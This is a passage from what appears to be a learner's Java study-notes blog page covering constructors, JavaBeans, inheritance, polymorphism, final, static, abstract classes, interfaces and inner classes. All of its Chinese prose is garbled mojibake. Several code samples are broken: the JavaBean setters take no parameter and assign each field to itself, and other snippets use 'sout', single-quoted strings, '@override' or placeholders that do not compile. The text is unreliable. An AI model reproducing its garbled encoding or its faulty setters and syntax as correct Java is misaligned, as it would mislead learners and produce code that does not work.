æ–¹æ³•ï¼Œä¸¤è€…æ–¹æ³•åç›¸åŒä½†å‚æ•°ä¸åŒï¼Œè¿™å«æ„é€ æ–¹æ³•çš„é‡è½½ã€‚</p></li><li><p>æ¨èä½¿ç”¨æ–¹å¼ï¼šæ— è®ºæ˜¯å¦ä½¿ç”¨ï¼Œéƒ½æ‰‹åŠ¨ä¹¦å†™ä¸¤ç§æ„é€ æ–¹æ³•ã€‚</p></li></ul><p>æ€»ç»“ï¼š</p><ul><li>æ„é€ æ–¹æ³•çš„ä½œç”¨ï¼Ÿåˆå§‹åŒ–æˆå‘˜å˜é‡ã€‚</li><li>æ„é€ æ–¹æ³•æœ‰å‡ ç§ï¼Ÿä½œç”¨ï¼Ÿä¸¤ç§ï¼Œæœ‰å‚æ„é€ å’Œæ— å‚æ„é€ ã€‚</li><li>æ„é€ æ–¹æ³•æœ‰å“ªäº›æ³¨æ„äº‹é¡¹ï¼Ÿå†™çš„æ—¶å€™ä¸¤ç§æ„é€ éƒ½è¦å†™å¥½ã€‚</li></ul><h4 id="æ ‡å‡†JavaBean"><a href="#æ ‡å‡†JavaBean" class="headerlink" title="æ ‡å‡†JavaBean"></a>æ ‡å‡†JavaBean</h4><p><img src="/img/javalearn48.png" alt="javalearn48"></p><p>ç»ƒä¹ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//beanbean</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">beanbean</span> &#123;<br>     <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String passwd;<br>    <span class="hljs-keyword">private</span> String email;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">beanbean</span><span class="hljs-params">()</span>&#123;<span class="hljs-comment">//æ— å‚æ„é€ </span><br>        System.out.println(<span class="hljs-string">&quot;æˆ‘æ˜¯æ— å‚æ„é€ ï¼&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">beanbean</span><span class="hljs-params">(String name, String email, <span class="hljs-type">int</span> age, String passwd)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.email = email;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.passwd = passwd;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setEmail</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.email = email;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEmail</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> email;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPasswd</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.passwd = passwd;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPasswd</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> passwd;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//beanwhat</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">beanwhat</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">beanbean</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">beanbean</span>();<br>        <span class="hljs-type">beanbean</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">beanbean</span>(<span class="hljs-string">&quot;txy&quot;</span>, <span class="hljs-string">&quot;q@q&quot;</span>, <span class="hljs-number">22</span>, <span class="hljs-string">&quot;shit&quot;</span>);<br><br>        System.out.println(b2.getName());<br>        System.out.println(b2.getAge());<br>        System.out.println(b2.getEmail());<br>        System.out.println(b2.getPasswd());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¿«æ·ç”Ÿæˆæœ‰å‚æˆ–æ— å‚æ„é€ ï¼š<code>alt + insert</code>é€‰æ‹©<code>construct</code>ã€‚ä¹Ÿèƒ½é€šè¿‡é€‰<code>getandset</code>å»å¿«é€Ÿç”Ÿæˆæ–¹æ³•ã€‚</p><p>æˆ–è€…é€šè¿‡<code>PTG</code>æ’ä»¶ï¼Œå†™å®Œå±æ€§ç›´æ¥å³é”®ç‚¹å‡»å°±å¥½ã€‚</p><p>p87 javaå†…å­˜ä»‹ç»</p><h4 id="åŸºæœ¬æ•°æ®ç±»å‹å’Œå¼•ç”¨æ•°æ®ç±»å‹"><a href="#åŸºæœ¬æ•°æ®ç±»å‹å’Œå¼•ç”¨æ•°æ®ç±»å‹" class="headerlink" title="åŸºæœ¬æ•°æ®ç±»å‹å’Œå¼•ç”¨æ•°æ®ç±»å‹"></a>åŸºæœ¬æ•°æ®ç±»å‹å’Œå¼•ç”¨æ•°æ®ç±»å‹</h4><p>ä¹‹å‰çš„è®°å¿†ï¼š</p><p><img src="/img/javalearn49.png" alt="javalearn49"></p><p>ä»å†…å­˜çš„è§’åº¦å»ç†è§£ï¼š</p><p><img src="/img/javalearn50.png" alt="javalearn50"></p><h4 id="thisçš„å†…å­˜åŸç†"><a href="#thisçš„å†…å­˜åŸç†" class="headerlink" title="thisçš„å†…å­˜åŸç†"></a>thisçš„å†…å­˜åŸç†</h4><p>p89</p><h4 id="æˆå‘˜å˜é‡å’Œå±€éƒ¨å˜é‡çš„åŒºåˆ«"><a href="#æˆå‘˜å˜é‡å’Œå±€éƒ¨å˜é‡çš„åŒºåˆ«" class="headerlink" title="æˆå‘˜å˜é‡å’Œå±€éƒ¨å˜é‡çš„åŒºåˆ«"></a>æˆå‘˜å˜é‡å’Œå±€éƒ¨å˜é‡çš„åŒºåˆ«</h4><ul><li>æˆå‘˜å˜é‡ï¼šç±»ä¸­æ–¹æ³•å¤–çš„å˜é‡</li><li>å±€éƒ¨å˜é‡ï¼šæ–¹æ³•ä¸­çš„å˜é‡</li></ul><h4 id="é¢å‘å¯¹è±¡ç»¼åˆç»ƒä¹ "><a href="#é¢å‘å¯¹è±¡ç»¼åˆç»ƒä¹ " class="headerlink" title="é¢å‘å¯¹è±¡ç»¼åˆç»ƒä¹ "></a>é¢å‘å¯¹è±¡ç»¼åˆç»ƒä¹ </h4><ul><li>æ–‡å­—ç‰ˆæ ¼æ–—æ¸¸æˆ</li></ul><p>P91-P95</p><p>P124ï¼š</p><h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><h4 id="å°è£…-1"><a href="#å°è£…-1" class="headerlink" title="å°è£…"></a>å°è£…</h4><p>å¯¹è±¡ä»£è¡¨ä»€ä¹ˆï¼Œå°±å¾—å°è£…ç›¸åº”çš„æ•°æ®ï¼Œå¹¶æä¾›æ•°æ®å¯¹åº”çš„è¡Œä¸ºã€‚</p><p><img src="/img/javalearn51.png" alt="javalearn51"></p><ul><li>Javaä¸­æä¾›ä¸€ä¸ªå…³é”®å­—extendsï¼Œç”¨è¿™ä¸ªå…³é”®å­—å¯ä»¥è®©ä¸€ä¸ªç±»å’Œæè°·ä¸€å„ç±»å»ºç«‹èµ·ç»§æ‰¿å…³ç³»ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&#123;&#125;<br></code></pre></td></tr></table></figure><ul><li>Studentæˆä¸ºå­ç±»(æ´¾ç”Ÿç±»)ï¼ŒPersonæˆä¸ºçˆ¶ç±»(åŸºç±»æˆ–è€…è¶…ç±»)ã€‚</li></ul><h4 id="ä½¿ç”¨ç»§æ‰¿çš„å¥½å¤„ï¼š"><a href="#ä½¿ç”¨ç»§æ‰¿çš„å¥½å¤„ï¼š" class="headerlink" title="ä½¿ç”¨ç»§æ‰¿çš„å¥½å¤„ï¼š"></a>ä½¿ç”¨ç»§æ‰¿çš„å¥½å¤„ï¼š</h4><ul><li>å¯ä»¥æŠŠå¤šä¸ªå­ç±»ä¸­é‡å¤çš„ä»£ç æŠ½å–åˆ°çˆ¶ç±»ä¸­ï¼Œæé«˜ä»£ç çš„å¤ç”¨æ€§ã€‚</li><li>å­ç±»å¯ä»¥åœ¨çˆ¶ç±»çš„åŸºç¡€ä¸Šï¼Œå¢åŠ å…¶ä»–çš„åŠŸèƒ½ï¼Œä½¿å­ç±»æ›´åŠ å¼ºå¤§ã€‚</li></ul><p><img src="/img/javalearn52.png" alt="javalearn52"></p><p>ç»§æ‰¿çš„ç‰¹ç‚¹ï¼š</p><p>Javaåªæ”¯æŒå•ç»§æ‰¿ï¼Œä¸æ”¯æŒå¤šç»§æ‰¿ï¼Œä½†æ”¯æŒå¤šå±‚ç»§æ‰¿ã€‚</p><p>å•ç»§æ‰¿ï¼šä¸€ä¸ªå­ç±»åªèƒ½åŠæˆæœä¸€ä¸ªçˆ¶ç±»ã€‚</p><p>ä¸æ”¯æŒå¤šç»§æ‰¿ï¼šå­ç±»ä¸èƒ½åŒæ—¶ç»§æ‰¿å¤šä¸ªçˆ¶ç±»ã€‚</p><p>å¤šå±‚ç»§æ‰¿ï¼šå­ç±»Aç»§æ‰¿çˆ¶ç±»Bï¼Œçˆ¶ç±»Bå¯ä»¥å†ç»§æ‰¿çˆ¶ç±»Cã€‚</p><p>æ¯ä¸ªç±»éƒ½ç›´æ¥æˆ–è€…é—´æ¥çš„ç»§æ‰¿äºObjectã€‚</p><p>éœ€æ³¨æ„å­ç±»åªèƒ½è®¿é—®çˆ¶ç±»ä¸­éç§æœ‰çš„æˆå‘˜ã€‚</p><p>P126-128</p><p>P129</p><h3 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å­¦ç”Ÿå½¢æ€</span><br><span class="hljs-type">Student</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br><span class="hljs-comment">//äººçš„å½¢æ€</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br></code></pre></td></tr></table></figure><p>ä½†è¿™ä¸œè¥¿æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</p><p><img src="/img/javalearn55.png" alt="javalearn55"></p><h4 id="ä»€ä¹ˆæ˜¯å¤šæ€ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å¤šæ€ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å¤šæ€ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯å¤šæ€ï¼Ÿ</h4><p>åŒç±»å‹çš„å¯¹è±¡ï¼Œè¡¨ç°å‡ºçš„ä¸åŒå½¢æ€ã€‚</p><h4 id="å¤šæ€çš„è¡¨ç°å½¢å¼"><a href="#å¤šæ€çš„è¡¨ç°å½¢å¼" class="headerlink" title="å¤šæ€çš„è¡¨ç°å½¢å¼"></a>å¤šæ€çš„è¡¨ç°å½¢å¼</h4><p>çˆ¶ç±»ç±»å‹ å¯¹è±¡åç§° &#x3D; å­ç±»å¯¹è±¡ã€‚</p><h4 id="å¤šæ€çš„å‰æ"><a href="#å¤šæ€çš„å‰æ" class="headerlink" title="å¤šæ€çš„å‰æ"></a>å¤šæ€çš„å‰æ</h4><p>æœ‰ç»§æ‰¿&#x2F;å®ç°å…³ç³»ï¼›</p><p>æœ‰çˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡( <code>Fu f = new Zi();</code>)</p><p>æœ‰æ–¹æ³•é‡å†™ã€‚</p><p>å¦‚æœæŸæ–¹æ³•æ¥æ”¶çš„å‚æ•°æ˜¯ä¸€ä¸ªçˆ¶ç±»ï¼Œé‚£ä¹ˆå¯ä»¥ç»™ä»–ä¼ æ‰€æœ‰çˆ¶ç±»ä¸‹çš„å­ç±»å¯¹è±¡ã€‚</p><p><img src="/img/javalearn56.png" alt="javalearn56"></p><p>P131&#x3D;132</p><h4 id="åŒ…å’Œfinal"><a href="#åŒ…å’Œfinal" class="headerlink" title="åŒ…å’Œfinal"></a>åŒ…å’Œfinal</h4><p><img src="/img/javalearn57.png" alt="javalearn57"></p><p><img src="/img/javalearn58.png" alt="javalearn58"></p><p>å¯¼åŒ…ï¼š</p><p><img src="/img/javalearn59.png" alt="javalearn59"></p><p><img src="/img/javalearn60.png" alt="javalearn60"></p><p><img src="/img/javalearn61.png" alt="javalearn61"></p><h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><ul><li>ä¿®é¥°æ–¹æ³•ï¼šè¡¨æ˜è¯¥æ–¹æ³•æ˜¯æœ€ç»ˆæ–¹æ³•ï¼Œä¸èƒ½è¢«é‡å†™ã€‚</li><li>ç±»ï¼šè¡¨æ˜è¯¥ç±»æ˜¯æœ€ç»ˆç±»ï¼Œä¸èƒ½è¢«ç»§æ‰¿ã€‚</li><li>å˜é‡ï¼šå«åšå¸¸é‡ï¼Œåªèƒ½è¢«èµ‹å€¼ä¸€æ¬¡ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fu</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        sout(<span class="hljs-string">&#x27;çˆ¶ç±»çš„showæ–¹æ³•&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Zi</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fu</span>&#123;<span class="hljs-comment">//è¿™é‡Œä¼šæŠ¥é”™</span><br>    <span class="hljs-meta">@override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        sout(<span class="hljs-string">&#x27;å­ç±»çš„showæ–¹æ³•&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ä¿®é¥°å˜é‡ï¼š</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn62.png" alt="javalearn62"></p><h4 id="æƒé™ä¿®é¥°ç¬¦"><a href="#æƒé™ä¿®é¥°ç¬¦" class="headerlink" title="æƒé™ä¿®é¥°ç¬¦"></a>æƒé™ä¿®é¥°ç¬¦</h4><ul><li>æƒé™ä¿®é¥°ç¬¦ï¼šæ˜¯ç”¨æ¥æ§åˆ¶ä¸€ä¸ªæˆå‘˜èƒ½å¤Ÿè¢«è®¿é—®çš„èŒƒå›´çš„ã€‚</li><li>å¯ä»¥ä¿®é¥°æˆå‘˜å˜é‡ï¼Œæ–¹æ³•ï¼Œæ„é€ æ–¹æ³•ï¼Œå†…éƒ¨ç±»ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn63.png" alt="javalearn63"></p><p><img src="/img/javalearn65.png" alt="javalearn65"></p><p>P134 ä»£ç å—æœªçœ‹</p><h4 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h4><p><img src="/img/javalearn66.png" alt="javalearn66"></p><p><img src="/img/javalearn67.png" alt="javalearn67"></p><p><img src="/img/javalearn68.png" alt="javalearn68"></p><ul><li>å·¥å…·ç±»ï¼š</li></ul><p>å¸®åŠ©æˆ‘ä»¬åšä¸€äº›äº‹æƒ…çš„ï¼Œä½†æ˜¯ä¸æè¿°ä»»ä½•äº‹ç‰©çš„ç±»ã€‚</p><ul><li>JavaBeanç±»ï¼š</li></ul><p>ç”¨æ¥æè¿°ä¸€ç±»äº‹ç‰©çš„ç±»ï¼Œæ¯”å¦‚ï¼Œstudent,teacher,dog,catç­‰ã€‚</p><ul><li>æµ‹è¯•ç±»</li></ul><p>ç”¨æ¥æ£€æŸ¥å…¶ä»–ç±»æ˜¯å¦ä¹¦å†™æ­£ç¡®ï¼Œå¸¦æœ‰mainæ–¹æ³•çš„ç±»ï¼Œæ˜¯ç¨‹åºçš„å…¥å£ã€‚</p><p><img src="/img/javalearn69.png" alt="javalearn69"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayUtil</span> &#123;<br>    <span class="hljs-comment">//ç§æœ‰åŒ–æ„é€ æ–¹æ³•ï¼Œç›®çš„ï¼šä¸è®©å¤–ç•Œåˆ›å»ºå®ƒçš„å¯¹è±¡</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">ArrayUtil</span><span class="hljs-params">()</span>&#123;<br>    &#125;<br>    <span class="hljs-comment">//éœ€è¦å®šä¹‰ä¸ºé™æ€çš„ï¼Œæ–¹ä¾¿è°ƒç”¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String xxxxxx<br>&#125;<br><span class="hljs-comment">//è°ƒç”¨æ—¶ï¼š</span><br>String ??? = ArrayUtil.æ–¹æ³•å(å‚æ•°)<br></code></pre></td></tr></table></figure><p>P123æœªçœ‹</p><h3 id="P135-æŠ½è±¡ç±»"><a href="#P135-æŠ½è±¡ç±»" class="headerlink" title="P135 æŠ½è±¡ç±»"></a>P135 æŠ½è±¡ç±»</h3><ul><li><p>æŠ½è±¡æ–¹æ³•ï¼šå°†å…±æ€§çš„è¡Œä¸º(æ–¹æ³•)æŠ½å–åˆ°çˆ¶ç±»ä¹‹åï¼Œç”±äºæ¯ä¸€ä¸ªå­ç±»æ‰§è¡Œçš„å†…å®¹æ˜¯ä¸ä¸€æ ·çš„ï¼Œè‹å“¦ä¸€åœ¨çˆ¶ç±»ä¸­ä¸èƒ½ç¡®å®šå…·ä½“çš„æ–¹æ³•ä½“ï¼Œè¯¥æ–¹æ³•å³è¯¾å®šä¹‰ä¸ºæŠ½è±¡æ–¹æ³•ã€‚</p></li><li><p>æŠ½è±¡ç±»ï¼šå¦‚æœä¸€ä¸ªç±»ä¸­å­˜åœ¨æŠ½è±¡æ–¹æ³•ï¼Œé‚£ä¹ˆå¿…é¡»å£°æ˜ä¸ºæŠ½è±¡ç±»ã€‚</p></li><li><p>æŠ½è±¡æ–¹æ³•çš„å­ç±»å¼ºåˆ¶é‡å†™ï¼Œä¸é‡å†™å°±æŠ¥é”™ã€‚</p></li><li><p>å®šä¹‰æ ¼å¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> è¿”å›å€¼ç±»å‹ æ–¹æ³•å(å‚æ•°åˆ—è¡¨);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> classs ç±»å&#123;&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/javalearn70.png" alt="javalearn70"></p></li></ul><h3 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h3><p> ä¸ºä»€ä¹ˆè¦å­˜åœ¨æ¥å£ï¼Ÿ</p><p><img src="/img/javalearn71.png" alt="javalearn71"></p><p>æ¥å£æ˜¯ä¸€ç§è§„åˆ™ï¼Œæ˜¯å¯¹è¡Œä¸ºçš„æŠ½è±¡ã€‚</p><p><img src="/img/jaaallearn72.png" alt="jaaallearn72"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Frog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Swim</span>&#123;<br>    <span class="hljs-meta">@override</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥å£ä¸­æˆå‘˜çš„ç‰¹ç‚¹ï¼š</p><ul><li>æˆå‘˜å˜é‡</li></ul><p>åªèƒ½æ˜¯å¸¸é‡</p><p>é»˜è®¤ä¿®é¥°ç¬¦ï¼š public static final</p><ul><li>æ„é€ æ–¹æ³•</li></ul><p>æ²¡æœ‰</p><ul><li>æˆå‘˜æ–¹æ³•</li></ul><p>åªèƒ½æ˜¯æŠ½è±¡æ–¹æ³•</p><p>é»˜è®¤ä¿®é¥°ç¬¦ï¼š public abstract</p><p>æ¥å£å’Œç±»ä¹‹é—´çš„å…³ç³»</p><ul><li>ç±»å’Œç±»çš„å…³ç³»</li></ul><p>ç»§æ‰¿å…³ç³»ï¼Œåªèƒ½å•ç»§æ‰¿ä¸èƒ½å¤šç»§æ‰¿ï¼Œä½†å¯ä»¥å¤šå±‚ç»§æ‰¿ã€‚</p><ul><li>ç±»å’Œæ¥å£çš„å…³ç³»</li></ul><p>å®ç°å…³ç³»ï¼Œå¯ä»¥ä½†å®ç°ï¼Œä¹Ÿå¯ä»¥å¤šå®ç°ï¼Œè¿˜å¯ä»¥åœ¨ç»§æ‰¿ä¸€ä¸ªç±»çš„åŒæ—¶å®ç°å¤šä¸ªæ¥å£ã€‚</p><ul><li>æ¥å£å’Œæ¥å£çš„å…³ç³»</li></ul><p>ç»§æ‰¿å…³ç³»ï¼Œå¯ä»¥å•ç»§æ‰¿ä¹Ÿå¯ä»¥å¤šç»§æ‰¿ã€‚</p><h3 id="å†…éƒ¨ç±»"><a href="#å†…éƒ¨ç±»" class="headerlink" title="å†…éƒ¨ç±»"></a>å†…éƒ¨ç±»</h3><p>ç±»çš„äº”å¤§æˆå‘˜ï¼š</p><p>å±æ€§ï¼Œæ–¹æ³•ï¼Œæ„é€ æ–¹æ³•ï¼Œä»£ç å—ï¼Œå†…éƒ¨ç±»ã€‚</p><p>åœ¨ä¸€ä¸ªç±»çš„é‡Œé¢ï¼Œå†å®šä¹‰ä¸€ä¸ªç±»ã€‚</p><p>e.g:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span>&#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¦å­¦ä¹ å†…éƒ¨ç±»ï¼Ÿ</p><p>éœ€æ±‚ï¼šå†™ä¸€ä¸ªjavabeanç±»æè¿°æ±½è½¦ã€‚</p><p>å±æ€§ï¼šå“ç‰Œï¼Œè½¦é¾„ï¼Œé¢œè‰²ï¼Œå‘åŠ¨æœºå“ç‰Œï¼Œä½¿ç”¨å¹´é™ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ä¼¼ä¹å¯ä»¥è¿™ä¹ˆå†™ï¼š</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> &#123;<br>    String carName;<br>    <span class="hljs-type">int</span> carAge;<br>    String engineName;<br>    <span class="hljs-type">int</span> engineAge;<br>    .........<br>&#125;<br></code></pre></td></tr></table></figure><p>å•å®é™…ä¸Šï¼Œå‘åŠ¨æœºç®—æ˜¯ä¸ªç‹¬ç«‹çš„ä¸ªä½“ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> &#123;<br>    String carName;<br>    <span class="hljs-type">int</span> carAge;<br>    .........<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Engine</span>&#123;<br> String engineName;<br>    <span class="hljs-type">int</span> engineAge;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†å®é™…ä¸Šå‘åŠ¨æœºè¿™ä¸œè¥¿è¦ä¾èµ–è½¦å­˜åœ¨ï¼Œæ‰€ä»¥å¯ä»¥ä¾é å†…éƒ¨ç±»å®ç°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> &#123; <span class="hljs-comment">//å¤–éƒ¨ç±»</span><br>    String carName;<br>    <span class="hljs-type">int</span> carAge;<br>    <br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Engine</span>&#123;<span class="hljs-comment">//å†…éƒ¨ç±»ï¼Œå¤–éƒ¨ç±»çš„ä¸€éƒ¨åˆ†ï¼Œå†…éƒ¨ç±»å•ç‹¬å‡ºç°æ²¡ä»»ä½•æ„ä¹‰</span><br>        String engineName;<br>    <span class="hljs-type">int</span> engineAge;<br>    